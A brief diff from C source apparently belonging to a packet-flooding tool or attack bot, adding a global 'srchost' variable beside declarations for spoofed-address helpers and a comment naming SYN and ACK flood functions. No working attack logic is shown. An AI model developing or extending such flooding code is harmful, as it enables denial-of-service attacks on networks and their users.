@@ -17,6 +17,8 @@ unsigned int get_spoofed();
 unsigned short in_cksum(unsigned short *ptr, int nbytes);
 int sockwrite(int sd, const char *fmt, ...);
 
+unsigned long srchost;
+
 
 /* synflood(), ngsynflood(), ackflood(), ngackflood() */
 /* these functions are adapted from ktx.c             */
